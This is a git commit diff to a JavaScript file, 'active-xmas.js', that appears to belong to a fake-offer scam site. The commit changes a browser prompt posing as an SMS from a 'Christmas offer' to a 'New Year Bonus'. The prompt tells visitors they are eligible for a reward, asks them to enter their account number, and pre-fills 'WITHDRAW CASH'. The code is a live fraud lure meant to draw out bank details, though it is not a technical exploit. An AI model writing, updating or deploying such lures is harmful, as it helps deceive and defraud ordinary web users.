27ed5c412ede27ef93be3967c7d50185729c1ae5
itidnewblog1 <newblog1itid@gmail.com>
2025-12-25 22:16:37 +0100

    Update active-xmas.js

--- active-xmas.js
+++ active-xmas.js
@@ -2,7 +2,7 @@
 /* Password Protection Script by www.onlineofferz.xyz*/
 var password = 'WITHDRAW CASH'
 password = prompt(
-  'SMS: Congratulations! You are eligible to receive Christmas offer. Please press OK to Enter your Account Number.',
+  'SMS: Congratulations! You are eligible to receive New Year Bonus. Please press OK to Enter your Account Number.',
   'WITHDRAW CASH'
 );
 if (password != 'WITHDRAW CASH') {
